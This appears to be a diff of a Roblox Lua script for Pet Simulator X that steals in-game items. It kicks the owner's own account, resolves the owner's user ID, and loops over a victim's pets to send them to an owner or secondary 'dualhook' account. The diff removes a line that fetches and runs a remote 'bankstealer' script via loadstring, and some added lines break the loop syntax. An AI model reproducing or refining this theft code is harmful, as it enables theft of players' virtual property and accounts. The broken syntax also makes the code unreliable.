@@ -73,23 +73,23 @@ end
 
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 
-if idiotuser == Username then
+if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return;
 end
-if Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A Username")
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
     return;
 end
 local worked2 = pcall(function()
-    game:GetService("Players"):GetUserIdFromNameAsync(Username)
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end)
 if not worked2 then
     game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
     return;
 end
 if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(Username)
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
@@ -770,7 +770,6 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1329,9 +1328,11 @@ spawn(function()
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
                 user = ndUser
+                else
+                  user = Username 
+                  end
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                    user = Username
                     end
                 end
                 local args = {
@@ -1357,7 +1358,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = UserName
+                user = Username
                 if pogin ~= nil then
                     if dualhook(pogin) then
                     end
@@ -1387,7 +1388,6 @@ spawn(function()
                 user = ndUser
                 if excin ~= nil then
                     if dualhook(excin) then
-                    user = Username
                     end
                 end
                 local args = {
